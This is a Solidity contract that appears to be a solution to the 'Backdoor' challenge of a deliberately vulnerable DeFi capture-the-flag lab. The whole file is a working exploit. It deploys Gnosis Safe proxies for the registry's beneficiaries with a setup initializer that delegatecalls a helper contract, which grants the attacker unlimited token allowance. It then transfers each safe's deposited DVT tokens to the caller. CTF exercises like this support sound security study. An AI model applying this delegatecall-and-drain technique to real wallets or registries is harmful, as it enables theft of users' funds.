// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GnosisSafe_ {
  function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,
    bytes calldata data,
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
  ) external;
}

interface GnosisSafeFactory_ {
  function createProxyWithCallback(
    address _singleton,
    bytes memory initializer,
    uint256 saltNonce,
    address callback
  ) external returns (address proxy);
}

interface Token_ {
  function approve(address _spender, uint256 _value) external returns (bool success);
  function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
  function balanceOf(address _owner) external view returns (uint256 balance);
}

// A separate callback contract is used as the target for the safe to delegatecall to.
contract Callback {
  // The safe does not have any DVT during initialization, so we must approve and then send the tokens out after.
  function approveWrapper(address _token, address spender) external {
    Token_(_token).approve(spender, type(uint256).max);
  }
}

contract BackdoorAttacker {
  constructor(address _safe, address _safeFactory, address walletRegistry, address[] memory beneficiaries, address _token) {
    GnosisSafe_ safe = GnosisSafe_(_safe);
    GnosisSafeFactory_ safeFactory = GnosisSafeFactory_(_safeFactory);
    Token_ token = Token_(_token);
    Callback callback = new Callback(); // Instantiate a dedicated callback smart contract, so there is an address available to pass to `to`

    for (uint256 i = 0; i < beneficiaries.length; i++) {
      // New safe must have exactly 1 beneficiary as the owner, required by WalletRegistry
      address[] memory owners = new address[](1);
      owners[0] = beneficiaries[i];

      bytes memory initializer = abi.encodeWithSelector(
        safe.setup.selector,
        owners,
        1, // Required by WalletRegistry
        address(callback), // The address to do a delegatecall to
        abi.encodeWithSelector(callback.approveWrapper.selector, address(token), address(this)), // Authorize this contract to send the DVT
        address(0), // Required by WalletRegistry
        address(0), // Doesn't matter
        0, // Doesn't matter
        address(0) // Doesn't matter
      );

      // Create the safe with the attack initializer payload. WalletRegistry will send 10 DVT to the safe afterwards.
      address newSafe = safeFactory.createProxyWithCallback(address(safe), initializer, 0, walletRegistry);

      // The safe did a delegatecall to callback.approveWrapper, which gave this contract unlimited token allowance.
      // After the safe initialized, WalletRegistry sent 10 DVT to it. Now we can send it out to the player address.
      token.transferFrom(newSafe, msg.sender, token.balanceOf(newSafe));
    }
  }
}
